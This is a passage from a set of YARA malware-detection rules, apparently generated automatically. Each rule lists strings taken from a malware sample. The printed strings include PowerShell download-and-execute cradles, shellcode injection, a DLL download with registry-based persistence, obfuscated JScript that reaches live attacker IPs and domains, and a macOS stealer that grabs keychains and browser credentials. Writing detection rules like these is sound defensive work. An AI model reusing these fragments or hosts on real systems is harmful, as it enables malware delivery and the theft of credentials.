      $x1 = " Script execution completed!${NC}\"\\n'},1072:(t,r,n)=>{n.r(r),n.d(r,{$Command:()=>re.Command,AssumeRoleWithWebIdentityCommand:(" ascii /* score: '113.50'*/
      $x2 = "\":r},StringDecoder.prototype.text=function utf8Text(t,r){var n=function utf8CheckIncomplete(t,r,n){var F=r.length-1;if(F<n)retu" ascii /* score: '109.00'*/
      $x3 = ":\"ss\"});function hasUnicode(t){return Me.test(t)}function stringToArray(t){return hasUnicode(t)?function unicodeToArray(t){ret" ascii /* score: '99.50'*/
      $x4 = "\",suffix:\"\"},ke=\"0123456789abcdefghijklmnopqrstuvwxyz\",Ie=!0;function BigNumber(t,r){var te,ne,ie,ae,ue,de,pe,ge,fe=this;if" ascii /* score: '98.50'*/
      $x5 = "[0m\")}else n[0]=function getDate(){if(r.inspectOpts.hideDate)return\"\";return(new Date).toISOString()+\" \"}()+F+\" \"+n[0]},r" ascii /* score: '85.00'*/
      $x6 = "[90m\"):(Colours.reset=\"\",Colours.bright=\"\",Colours.dim=\"\",Colours.red=\"\",Colours.green=\"\",Colours.yellow=\"\",Colours" ascii /* score: '81.00'*/
      $x7 = "\"},num_dec:{regex:/&#([0-9]{1,7});/g,val:(t,r)=>String.fromCodePoint(Number.parseInt(r,10))},num_hex:{regex:/&#x([0-9a-fA-F]{1," ascii /* score: '79.50'*/
      $x8 = "import{createRequire as __WEBPACK_EXTERNAL_createRequire}from\"node:module\";var __webpack_modules__={1:(t,r,n)=>{n.r(r),n.d(r,{" ascii /* score: '67.00'*/
      $x9 = "t r;t.logger?.debug(\"@aws-sdk/credential-provider-http - fromHttp\");const n=t.awsContainerCredentialsRelativeUri??process.env." ascii /* score: '43.00'*/
      $x10 = "exe\":\"trufflehog\",n=`tar -xzf \"${t}\" -C \"${process.cwd()}\" ${r}`;(0,te.execSync)(n,{stdio:\"pipe\"}),\"windows\"!==this.s" ascii /* score: '40.00'*/
      $x11 = "{logger:t})=>{if(process.env[ae])return{hostname:\"169.254.170.2\",path:process.env[ae]};if(process.env[se]){const r=(0,te.parse" ascii /* score: '39.00'*/
      $x12 = "{t.logger?.debug(\"@aws-sdk/credential-provider-web-identity - fromTokenFile\");const r=t?.webIdentityTokenFile??process.env[oe]" ascii /* score: '38.00'*/
      $x13 = ",ae=\"AWS_ACCOUNT_ID\",fromEnv=t=>async()=>{t?.logger?.debug(\"@aws-sdk/credential-provider-env - fromEnv\");const r=process.env" ascii /* score: '38.00'*/
      $x14 = "parentClientConfig}};n.logger?.debug(\"@aws-sdk/token-providers - fromSso\");const ce=await(0,te.parseKnownFiles)(n),le=(0,te.ge" ascii /* score: '37.00'*/
      $x15 = "Config}};n.logger?.debug(\"@aws-sdk/token-providers - fromSso\");const ce=await(0,te.parseKnownFiles)(n),le=(0,te.getProfileName" ascii /* score: '37.00'*/
   condition:
      uint16(0) == 0x2a2f and filesize < 11000KB and
      1 of ($x*)
}

rule sig_47de623bd6d881df1a13b9c8127186d54e1750e49692969002088b4ec56ce458_47de623b {
   meta:
      description = "_subset_batch - file 47de623bd6d881df1a13b9c8127186d54e1750e49692969002088b4ec56ce458_47de623b.unknown"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "47de623bd6d881df1a13b9c8127186d54e1750e49692969002088b4ec56ce458"
   strings:
      $s1 = "dj4jJzN96" fullword ascii /* base64 encoded string 'v>#'3}' */ /* score: '11.00'*/
      $s2 = "LzH!!!" fullword ascii /* score: '10.00'*/
      $s3 = "* T@=mm" fullword ascii /* score: '9.00'*/
      $s4 = "DFUNI -" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5089 and filesize < 5000KB and
      all of them
}

rule sig_4916eeb1faa4d17b93d732501b418cb9846c301dc9a425e6561809aeaa147559_4916eeb1 {
   meta:
      description = "_subset_batch - file 4916eeb1faa4d17b93d732501b418cb9846c301dc9a425e6561809aeaa147559_4916eeb1.unknown"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "4916eeb1faa4d17b93d732501b418cb9846c301dc9a425e6561809aeaa147559"
   strings:
      $s1 = "ajouf\"x -" fullword ascii /* score: '8.00'*/
      $s2 = "LqSG9J* " fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x0000 and filesize < 500KB and
      all of them
}

rule sig_4f2c04c6cf823ebed3ad88a6a85c516b74e172bd924d27c3ac50adf7451d04f5_4f2c04c6 {
   meta:
      description = "_subset_batch - file 4f2c04c6cf823ebed3ad88a6a85c516b74e172bd924d27c3ac50adf7451d04f5_4f2c04c6.zip"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "4f2c04c6cf823ebed3ad88a6a85c516b74e172bd924d27c3ac50adf7451d04f5"
   strings:
      $s1 = "* =!aB" fullword ascii /* score: '9.00'*/
      $s2 = "* V)yD/;a2R" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 11000KB and
      all of them
}

rule sig_5272bfc4b3b0e6baf9fdc2d78eded489c1cd7a06813f036cc9f29c6124c4f96c_5272bfc4 {
   meta:
      description = "_subset_batch - file 5272bfc4b3b0e6baf9fdc2d78eded489c1cd7a06813f036cc9f29c6124c4f96c_5272bfc4.py"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "5272bfc4b3b0e6baf9fdc2d78eded489c1cd7a06813f036cc9f29c6124c4f96c"
   strings:
      $s1 = "url = \"http://Wazuh-Endpoint.com:PortNumber\"" fullword ascii /* score: '20.00'*/
      $s2 = "response = requests.get(URL, verify=False, auth=(user, password))" fullword ascii /* score: '20.00'*/
      $s3 = "    endpoint = \"/syscollector/\" + agentlist + \"/processes\"" fullword ascii /* score: '19.00'*/
      $s4 = "            fieldnames = ['Process Name', 'PID', \"Agent Name\"]" fullword ascii /* score: '15.00'*/
      $s5 = "    response = requests.get(second, verify=False, auth=(user, password))" fullword ascii /* score: '15.00'*/
      $s6 = "            writer.writerow({'Process Name': i[\"name\"], 'PID': i[\"pid\"], 'Agent Name':agentlist})" fullword ascii /* score: '15.00'*/
      $s7 = "URL = url + agentNames" fullword ascii /* score: '13.00'*/
      $s8 = "password= '<PassWord>'" fullword ascii /* score: '12.00'*/
      $s9 = "import requests" fullword ascii /* score: '9.00'*/
      $s10 = "import csv" fullword ascii /* score: '9.00'*/
      $s11 = "agentNames = \"/agents\"" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x6d69 and filesize < 2KB and
      8 of them
}

rule sig_52eab37f4d9b170c100cace1efca3622c2488a770216b813f392292ef4b85672_52eab37f {
   meta:
      description = "_subset_batch - file 52eab37f4d9b170c100cace1efca3622c2488a770216b813f392292ef4b85672_52eab37f.zip"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "52eab37f4d9b170c100cace1efca3622c2488a770216b813f392292ef4b85672"
   strings:
      $s1 = "COMPROVATIVO-28976452-SETEMBRO-4HDYN-X8RL6 - 319/COMPROVATIVO-28976452-SETEMBRO-4HDYN-X8RL6 - 319.html" fullword ascii /* score: '15.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 1000KB and
      all of them
}

rule sig_56cf64ca5d71f829a5db031b0ea02ad7aaf9cafe881fbbe30487bd5dccf7a4f6_56cf64ca {
   meta:
      description = "_subset_batch - file 56cf64ca5d71f829a5db031b0ea02ad7aaf9cafe881fbbe30487bd5dccf7a4f6_56cf64ca.ps1"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "56cf64ca5d71f829a5db031b0ea02ad7aaf9cafe881fbbe30487bd5dccf7a4f6"
   strings:
      $s1 = "$downloadUrl = \"http://94.154.35.115/user_profiles_photo/cptch.bin\"" fullword ascii /* score: '27.00'*/
      $s2 = "    [DllImport(\"kernel32.dll\", SetLastError = true)]" fullword ascii /* score: '17.00'*/
      $s3 = "    Write-Host \" : $($payloadData.Length) \" -ForegroundColor Green" fullword ascii /* score: '17.00'*/
      $s4 = "    $payloadData = $webClient.DownloadData($downloadUrl)" fullword ascii /* score: '14.00'*/
      $s5 = "    [System.Runtime.InteropServices.Marshal]::Copy($payloadData, 0, $memoryAddress, $memorySize)" fullword ascii /* score: '14.00'*/
      $s6 = "    public const uint PAGE_EXECUTE_READWRITE = 0x40;" fullword ascii /* score: '12.00'*/
      $s7 = "        [Win32API]::PAGE_EXECUTE_READWRITE, [ref]$previousProtection)" fullword ascii /* score: '9.00'*/
      $s8 = "        [Win32API]::MEM_COMMIT -bor [Win32API]::MEM_RESERVE, [Win32API]::PAGE_READWRITE)" fullword ascii /* score: '9.00'*/
      $s9 = "    $webClient = New-Object System.Net.WebClient" fullword ascii /* score: '9.00'*/
      $s10 = "    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParame" ascii /* score: '8.00'*/
      $s11 = "    Write-Host \"  \" -ForegroundColor Green" fullword ascii /* score: '8.00'*/
      $s12 = "    $memorySize = $payloadData.Length" fullword ascii /* score: '8.00'*/
      $s13 = "    Write-Host \" : $($_.Exception.Message)\" -ForegroundColor Red" fullword ascii /* score: '8.00'*/
      $s14 = "    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParame" ascii /* score: '8.00'*/
      $s15 = "Add-Type -TypeDefinition @\"" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x6441 and filesize < 7KB and
      8 of them
}

rule sig_5ba851a46be6fec695c68a3c1facceeaee9248b7fea4d058229adec568e2a987_5ba851a4 {
   meta:
      description = "_subset_batch - file 5ba851a46be6fec695c68a3c1facceeaee9248b7fea4d058229adec568e2a987_5ba851a4.ps1"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "5ba851a46be6fec695c68a3c1facceeaee9248b7fea4d058229adec568e2a987"
   strings:
      $x1 = "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -Command \"iex ((New-Object Net.WebClient).DownloadString('htt" ascii /* score: '47.00'*/
      $x2 = "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -Command \"iex ((New-Object Net.WebClient).DownloadString('htt" ascii /* score: '44.00'*/
      $s3 = "s://ctrlcapaserc.com/bomla'))\"" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x6f70 and filesize < 1KB and
      1 of ($x*) and all of them
}

rule sig_6161fea5a04008961449d46fc34d0d0fcf90172d14f17ab0e331ee9b115d5cfd_6161fea5 {
   meta:
      description = "_subset_batch - file 6161fea5a04008961449d46fc34d0d0fcf90172d14f17ab0e331ee9b115d5cfd_6161fea5.ps1"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "6161fea5a04008961449d46fc34d0d0fcf90172d14f17ab0e331ee9b115d5cfd"
   strings:
      $s1 = "$source = \"C:\\Windows\\System32\\auditpol.exe\"" fullword ascii /* score: '25.00'*/
      $s2 = "$dllUrl = \"http://128.140.70.83:8080/panamera.dll\"" fullword ascii /* score: '24.00'*/
      $s3 = "$dllDestination = \"$env:LOCALAPPDATA\\Microsoft\\auditpolcore.dll\"" fullword ascii /* score: '22.00'*/
      $s4 = "$destination1 = \"$env:LOCALAPPDATA\\Microsoft\\auditpol.exe\"" fullword ascii /* score: '17.00'*/
      $s5 = "$destination2 = \"$env:LOCALAPPDATA\\Microsoft\\auditpoll.exe\"" fullword ascii /* score: '17.00'*/
      $s6 = "$registryPath = \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\"" fullword ascii /* score: '16.00'*/
      $s7 = "Set-ItemProperty -Path $registryPath -Name $name -Value $value -Type String" fullword ascii /* score: '15.00'*/
      $s8 = "    Start-Process -FilePath $destination1" fullword ascii /* score: '14.00'*/
      $s9 = "        Invoke-WebRequest -Uri $dllUrl -OutFile $dllDestination" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x7324 and filesize < 3KB and
      all of them
}

rule sig_629c324c37ac630713373e8f4573c5e0992e0a38f9b1e0b2fc6e6f7135ece39c_629c324c {
   meta:
      description = "_subset_batch - file 629c324c37ac630713373e8f4573c5e0992e0a38f9b1e0b2fc6e6f7135ece39c_629c324c.ps1"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "629c324c37ac630713373e8f4573c5e0992e0a38f9b1e0b2fc6e6f7135ece39c"
   strings:
      $s1 = "6D70202B2027" ascii /* score: '17.00'*/ /* hex encoded string 'mp + '' */
      $s2 = "696F6E20636A" ascii /* score: '17.00'*/ /* hex encoded string 'ion cj' */
      $s3 = "rlpPOFZOoOJZAMVtNaZDPJNuOGBozqszXyokNZHzgqbVfPNfkEyeVONhXvAIDkPxVKBCXlfnTZXYhsOysVEusNdIlGMSZzwvbdzVOLHzYKLwroAfgBPhgUFIgtRQZNOT" ascii /* score: '12.00'*/
      $s4 = "rlpPOFZOoOJZAMVtNaZDPJNuOGBozqszXyokNZHzgqbVfPNfkEyeVONhXvAIDkPxVKBCXlfnTZXYhsOysVEusNdIlGMSZzwvbdzVOLHzYKLwroAfgBPhgUFIgtRQZNOT" ascii /* score: '12.00'*/
      $s5 = "FarySzeWMosTJFXRuJYkKgNxxzftGXLBMICePVuOWGkwjPEmANjhpHAYNtBSUlQpdqHADtCZPKNDwRNhvstsodMFHdRVTbulqvStIDjGLKSeuxbwfTXbsXAzdBtZcgFn" ascii /* score: '9.00'*/
      $s6 = "qjGRfyIRhlFJLLuoUAJZTCmlDaYWUhDnUmmXQLTZIasZUyJatDwZMbKnwVOEZmxAiSpYZWYJhjRsJNREQycQkdatbybvxOAVcsrBJlBWfnscJSdjDJobJgPErwxavdLS" ascii /* score: '9.00'*/
      $s7 = "JwlTlkbdDQysozgcOTnjPIrCVWsWsfRyWpqgxUhyTRNiBTDTlADZeZuAEjyOsEkXyzWyJAetlpPxuIBBSYlscsUwupcOWTGPhpkBxFKlVJnoKxGviwvTTsvFfZDTXQXR" ascii /* score: '9.00'*/
      $s8 = "PcMByUZrJmheLhKJCUqzDSsSuTPGKJefFePRkZxKugSGqWnwqjXHpFkwjuGfFShzHCZhStZcXfFXAmcYfTPamWpzuSiqTSFczSyowFdxJukKAMvwSizlCGNlNZnAKjJF" ascii /* score: '9.00'*/
      $s9 = "qjGRfyIRhlFJLLuoUAJZTCmlDaYWUhDnUmmXQLTZIasZUyJatDwZMbKnwVOEZmxAiSpYZWYJhjRsJNREQycQkdatbybvxOAVcsrBJlBWfnscJSdjDJobJgPErwxavdLS" ascii /* score: '9.00'*/
      $s10 = "HVdAfooKIiXcGNNAWNayHYIEyvPQEfTpvrjqgDqqxiYXppbneBWvIaTjNZCkZXGdPhgOdXUTWkBZAlOIUblDJXhVXAdHBGQacuHHJMKHgC" fullword ascii /* score: '9.00'*/
      $s11 = "JwlTlkbdDQysozgcOTnjPIrCVWsWsfRyWpqgxUhyTRNiBTDTlADZeZuAEjyOsEkXyzWyJAetlpPxuIBBSYlscsUwupcOWTGPhpkBxFKlVJnoKxGviwvTTsvFfZDTXQXR" ascii /* score: '9.00'*/
      $s12 = "$tkBCgCGwg = $ghscXa  -replace ']','4' -replace '>','5';" fullword ascii /* score: '8.00'*/
      $s13 = "for($i=0; $i -lt $tkBCgCGwg.Length; $i+=2){[void]$wjRsLWjby.Append( [char]([Convert]::ToInt32($tkBCgCGwg.Substring($i,2),16)) )}" ascii /* score: '8.00'*/
      $s14 = "for($i=0; $i -lt $tkBCgCGwg.Length; $i+=2){[void]$wjRsLWjby.Append( [char]([Convert]::ToInt32($tkBCgCGwg.Substring($i,2),16)) )}" ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x4c7a and filesize < 70KB and
      8 of them
}

rule sig_640af8b6d7cc95546ae18f4a22faebbd791dd3bcf37fc564f6351d39bce0f874_640af8b6 {
   meta:
      description = "_subset_batch - file 640af8b6d7cc95546ae18f4a22faebbd791dd3bcf37fc564f6351d39bce0f874_640af8b6.zip"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "640af8b6d7cc95546ae18f4a22faebbd791dd3bcf37fc564f6351d39bce0f874"
   strings:
      $s1 = "gameinputredist.dll" fullword ascii /* score: '23.00'*/
      $s2 = "gameinput.dll" fullword ascii /* score: '23.00'*/
      $s3 = "gameinputsvc.exe" fullword ascii /* score: '22.00'*/
      $s4 = "gameinputredist.dllVDw|lz" fullword ascii /* score: '12.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 600KB and
      all of them
}

rule sig_6721fa0ded249ff2595370fd1a13e73df7db70ceb2dc4ca8f1234d583221a8b9_6721fa0d {
   meta:
      description = "_subset_batch - file 6721fa0ded249ff2595370fd1a13e73df7db70ceb2dc4ca8f1234d583221a8b9_6721fa0d.ps1"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "6721fa0ded249ff2595370fd1a13e73df7db70ceb2dc4ca8f1234d583221a8b9"
   strings:
      $s1 = "68202B2027" ascii /* score: '17.00'*/ /* hex encoded string 'h + '' */
      $s2 = "oeaCrYibInTJMpSKElyjKEyCVYWZUDTEljVnyjfviBQRWDxBWJghNwojgYhSCJGEUPXdTfMUFDAJogfRaUCLXlqpulHZCNtYuMxHfUiqxLcKvevzsPrhHvhjYiihYmSs" ascii /* score: '10.00'*/
      $s3 = "oeaCrYibInTJMpSKElyjKEyCVYWZUDTEljVnyjfviBQRWDxBWJghNwojgYhSCJGEUPXdTfMUFDAJogfRaUCLXlqpulHZCNtYuMxHfUiqxLcKvevzsPrhHvhjYiihYmSs" ascii /* score: '10.00'*/
      $s4 = "YkToLdLupyugnMyRmHUdAIRCxGdojbLgRfsYMjPRGdICtbsczxupTXnPTQqFzWKNnOPHTaECrDWXAPJWNApmhWNurdFwsKRkSuPfMlJYsryPBQODHUrzhXfQAUPqVHJg" ascii /* score: '9.00'*/
      $s5 = "MspKjhqotCtHZBpeSyjHiEisqcffsIUDVnRvmwjMbMbhXsBuFmZVkYSHKwTGCLvkiplljurVPXgWdBVxalZGizSxUJkpddJQQqzhHQKLuDGNsweIbVfRlpCiWnQaJBsm" ascii /* score: '9.00'*/
      $s6 = "YqvJZrQYLDIDWLKEkWgxKBlYxVCZWYQnAyLrwZkQqZkmXlpiAcFiwyEXEWLEpqCnmUCYATHLlQGlQyBMfTZtTirCtomZNgaAXxACjRihVuwgrTHGVzYWRITDdAeMgixF" ascii /* score: '9.00'*/
      $s7 = "tygVwWHfmNEiXCXPiuFtpIbVAzJukpYtaKAdegaPEWOmggVlrnwqcOflWKUxMMvwpLIMBukCTqoSuppUdYDwtiRLfPGUMcDsbRxVYJjwCuWmaMqhUAUoJyCGtwglnQqr" ascii /* score: '9.00'*/
      $s8 = "YOeWHhSeElQYSPyJWYZuiQVLkBDmEKzbWxZDSBRzOCrzXpuvFtWyMMDHsSmFegatmoBUqvqVGagfYWouHIhLoAPJuRKzOLVicyNinZEKCBrlgXjWeryWyOFlZsaYkqGv" ascii /* score: '9.00'*/
      $s9 = "YOeWHhSeElQYSPyJWYZuiQVLkBDmEKzbWxZDSBRzOCrzXpuvFtWyMMDHsSmFegatmoBUqvqVGagfYWouHIhLoAPJuRKzOLVicyNinZEKCBrlgXjWeryWyOFlZsaYkqGv" ascii /* score: '9.00'*/
      $s10 = "YqvJZrQYLDIDWLKEkWgxKBlYxVCZWYQnAyLrwZkQqZkmXlpiAcFiwyEXEWLEpqCnmUCYATHLlQGlQyBMfTZtTirCtomZNgaAXxACjRihVuwgrTHGVzYWRITDdAeMgixF" ascii /* score: '9.00'*/
      $s11 = "aYbbZSKJROswINnSuVhfCYDeNeSPmsYaFehhKLvBeCtuyxfJjizmBKsBUxNvAuWZqSqegGHjafBAfJfQyIgEslZumfMMxzBjfTEgGBddaQLWJrVLSwxrNSgEtwsAtula" ascii /* score: '9.00'*/
      $s12 = "YkToLdLupyugnMyRmHUdAIRCxGdojbLgRfsYMjPRGdICtbsczxupTXnPTQqFzWKNnOPHTaECrDWXAPJWNApmhWNurdFwsKRkSuPfMlJYsryPBQODHUrzhXfQAUPqVHJg" ascii /* score: '9.00'*/
      $s13 = "NQGmBnqKaOLfsFEYecOHxseaoQKTzkCtKUzcprGofVqXdXqRjrvhnloUlfylcWKqMSUYFbimVZbbCHxQatkHoUGZferKtVLJKzLKDRLHJILNJMSehhLjmCBrMutakYtz" ascii /* score: '9.00'*/
      $s14 = "gZfGcEvtLOGISGNatJoyKnXHYnPdrbzFpGCuUPNKNfuksrRtKwhuJEztBYhopSCkOATLETFdvdlfsmPhVVTuuFwlGIswhZVucJVrYFpqrDyfSTBPJATTzIqJDhEvaJvW" ascii /* score: '9.00'*/
      $s15 = "tvVkyidnfngBtcDOOhKCLZiszpSZuvQnloBEeEXAQOrpjCsNftEiSrjUNdlJQDtkWtQFbyjJJKlxisIwxEuBqiVtEgqBTOkMVGSqmnmgJuZHGmmVUoLLJrtoXWAuIipu" ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5559 and filesize < 90KB and
      8 of them
}

rule sig_678ae1643ed502e8829dc17d514683e9f32155c312bbee976ae42475942c9a59_678ae164 {
   meta:
      description = "_subset_batch - file 678ae1643ed502e8829dc17d514683e9f32155c312bbee976ae42475942c9a59_678ae164.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "678ae1643ed502e8829dc17d514683e9f32155c312bbee976ae42475942c9a59"
   strings:
      $x1 = "(function(c,d){var r=b,e=c();while(!![]){try{var f=parseInt(r(0x1b0))/0x1+parseInt(r(0x1ca))/0x2+-parseInt(r(0x1b4))/0x3+parseIn" ascii /* score: '39.00'*/
      $s2 = "b','Write','Open','MSXML2.XMLHTTP','1196906yprBJK','CreateFolder','NameSpace','.exe','3598175rBNKhk','%TEMP%','GetFolder','01234" ascii /* score: '30.00'*/
      $s3 = "','Shell.Application','moveNext','5814304iybckW','Sleep','2830imlwmZ','FolderExists','Copy','http://196.251.73.58/H2/MEX.zip','6" ascii /* score: '16.00'*/
      $s4 = "n b=function(f,g){f=f-0x1af;var h=e[f];return h;},b(c,d);}function a(){var x=['item','Scripting.FileSystemObject','WScript.Shell" ascii /* score: '12.00'*/
      $s5 = "78618inrWjX','status','Name','4MMjpBS','1946031IJQEgV','Run','responseBody','ExpandEnvironmentStrings','78849cgUyUK','charAt','a" ascii /* score: '12.00'*/
      $s6 = "c7)](p[u(0x1b6)]),q['SaveToFile'](o,0x2),q['Close'](),!![];}function l(n,o){var v=s,p=WScript[v(0x1bd)](v(0x1d5)),q=p[v(0x1cc)](" ascii /* score: '10.00'*/
      $s7 = "),(function(){var s=b,c=WScript[s(0x1bd)](s(0x1d4)),d=WScript[s(0x1bd)](s(0x1d3)),f=c[s(0x1b7)](s(0x1cf)),g=s(0x1af),h=d['BuildP" ascii /* score: '10.00'*/
      $s8 = "r w=s,o=new Enumerator(d[w(0x1d0)](n)[w(0x1c4)]);while(!o[w(0x1ba)]()){var p=o[w(0x1d2)]();if(d['GetExtensionName'](p[w(0x1b2)])" ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x6628 and filesize < 6KB and
      1 of ($x*) and all of them
}

rule sig_6a16b1ef16e999a0d32a4b9189f6f179d629ba143b5b03db06c95156ee089615_6a16b1ef {
   meta:
      description = "_subset_batch - file 6a16b1ef16e999a0d32a4b9189f6f179d629ba143b5b03db06c95156ee089615_6a16b1ef.vbs"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "6a16b1ef16e999a0d32a4b9189f6f179d629ba143b5b03db06c95156ee089615"
   strings:
      $s1 = "objShell.Run command, 0, True" fullword ascii /* score: '23.00'*/
      $s2 = "tempFolder = objShell.ExpandEnvironmentStrings(\"%TEMP%\")" fullword ascii /* score: '20.00'*/
      $s3 = "homeFolder = objShell.ExpandEnvironmentStrings(\"%USERPROFILE%\")" fullword ascii /* score: '19.00'*/
      $s4 = "Dim objShell, command" fullword ascii /* score: '17.00'*/
      $s5 = "command = \"\"\"\" & sevenZipPath & \"\"\" x \"\"\" & archivePath & \"\"\" -o\"\"\" & homeFolder & \"\"\" -pppp -y\"" fullword ascii /* score: '16.00'*/
      $s6 = "objShell.Run exePath, 0, False" fullword ascii /* score: '15.00'*/
      $s7 = "exePath = sdkFolder & \"\\nvidiasdk.exe\"" fullword ascii /* score: '11.00'*/
      $s8 = "Dim tempFolder, sdkFolder, homeFolder" fullword ascii /* score: '11.00'*/
      $s9 = "sdkFolder = tempFolder & \"\\nvidiasdk\"" fullword ascii /* score: '11.00'*/
      $s10 = "sevenZipPath = sdkFolder & \"\\.vscode\\argv.exe\"" fullword ascii /* score: '11.00'*/
   condition:
      uint16(0) == 0x6944 and filesize < 1KB and
      all of them
}

rule sig_6ccf01108a395efab19029b699a62025dcca2ddb2bb3c95fd88e88b2d40a8efb_6ccf0110 {
   meta:
      description = "_subset_batch - file 6ccf01108a395efab19029b699a62025dcca2ddb2bb3c95fd88e88b2d40a8efb_6ccf0110.zip"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "6ccf01108a395efab19029b699a62025dcca2ddb2bb3c95fd88e88b2d40a8efb"
   strings:
      $s1 = "Projeto Imobiliario Informacoes Precos B1209.bat" fullword ascii /* score: '15.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 1000KB and
      all of them
}

rule sig_7471067d30ca7ae17e181a509e4cc9ae58b82db9ee72f8732abacd3c27755a0b_7471067d {
   meta:
      description = "_subset_batch - file 7471067d30ca7ae17e181a509e4cc9ae58b82db9ee72f8732abacd3c27755a0b_7471067d.unknown"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "7471067d30ca7ae17e181a509e4cc9ae58b82db9ee72f8732abacd3c27755a0b"
   strings:
      $s1 = ".klR:\\" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x5089 and filesize < 7000KB and
      all of them
}

rule sig_79bf9b14903f5b97c0ac4ba8b3085723a4fb92b6f9adddf3634a829c6f5cbbb6_79bf9b14 {
   meta:
      description = "_subset_batch - file 79bf9b14903f5b97c0ac4ba8b3085723a4fb92b6f9adddf3634a829c6f5cbbb6_79bf9b14.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "79bf9b14903f5b97c0ac4ba8b3085723a4fb92b6f9adddf3634a829c6f5cbbb6"
   strings:
      $s1 = "do shell script \"ditto -c -k --sequesterRsrc \" & writemind & \" /tmp/telemetry.zip\"" fullword ascii /* score: '29.00'*/
      $s2 = "set result to do shell script \"security 2>&1 > /dev/null find-generic-password -ga \\\"Chrome\\\" | awk \\\"{print $2}\\\"\"" fullword ascii /* score: '27.00'*/
      $s3 = "do shell script \"mkdir -p \" & filePosixPath" fullword ascii /* score: '23.00'*/
      $s4 = "set fileType to (do shell script \"file -b \" & filePosixPath)" fullword ascii /* score: '23.00'*/
      $s5 = "set result to do shell script \"dscl . authonly \" & quoted form of username & space & quoted form of password_entered" fullword ascii /* score: '23.00'*/
      $s6 = "set fsz to (do shell script \"/usr/bin/mdls -name kMDItemFSSize -raw \" & theItem)" fullword ascii /* score: '22.00'*/
      $s7 = "set randomNumber to do shell script \"echo $((RANDOM % 9000000 + 1000000))\"" fullword ascii /* score: '19.00'*/
      $s8 = "readwrite(profile & \"/Library/Keychains/login.keychain-db\", writemind & \"login.keychain-db\")" fullword ascii /* score: '18.00'*/
      $s9 = "set password_entered to getpwd(username, writemind)" fullword ascii /* score: '17.00'*/
      $s10 = "set result to display dialog \"To run the application you need to change the settings for its operation.\" default answer \"\" w" ascii /* score: '17.00'*/
      $s11 = "writeText(\"\\nPassword: \" & password_entered & \"\\n\\n\", writemind & \"info\")" fullword ascii /* score: '16.00'*/
      $s12 = "set result to (do shell script \"system_profiler SPSoftwareDataType SPHardwareDataType SPDisplaysDataType\")" fullword ascii /* score: '15.00'*/
      $s13 = "set chromiumFiles to {\"/Network/Cookies\", \"/Cookies\", \"/Web Data\", \"/Login Data\", \"/Local Extension Settings/\", \"/Ind" ascii /* score: '14.00'*/
      $s14 = "readwrite(itemPath, savePath)" fullword ascii /* score: '14.00'*/
      $s15 = "set exceptionsList to {\".DS_Store\", \"Partitions\", \"Code Cache\", \"Cache\", \"market-history-cache.json\", \"journals\", \"" ascii /* score: '13.00'*/
   condition:
      uint16(0) == 0x6e6f and filesize < 50KB and
      8 of them
}

rule sig_7ad613dee75da11ef9b7a92823bda3e290491e245956f5a192a3207a5f11d9a0_7ad613de {
   meta:
      description = "_subset_batch - file 7ad613dee75da11ef9b7a92823bda3e290491e245956f5a192a3207a5f11d9a0_7ad613de.ps1"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "7ad613dee75da11ef9b7a92823bda3e290491e245956f5a192a3207a5f11d9a0"
   strings:
      $s1 = "$dialogBitmap = $json.ProductID + \".png\"" fullword wide /* score: '16.00'*/
      $s2 = "$domain = \"7df4va.com\"" fullword wide /* score: '14.00'*/
      $s3 = "$web = New-Object System.Net.WebClient" fullword wide /* score: '14.00'*/
      $s4 = "# hvcNAQkEMSIEIKNsyJtUmOeC57m5jYniJPwofwPfCsc6erXwnaTi/47AMDgGCisG" fullword wide /* score: '13.00'*/
      $s5 = "# 5jtb7IHeIhTZgirHkr+g3uM+onP65x9abJTyUpURK1h0QCirc0PO30qhHGs4xSnz" fullword wide /* score: '13.00'*/
      $s6 = "# /RzY9HdaXFSMb++hUD38dglohJ9vytsgjTVgHAIDyyCwrFigDkBjxZgiwbJZ9VVr" fullword wide /* score: '12.00'*/
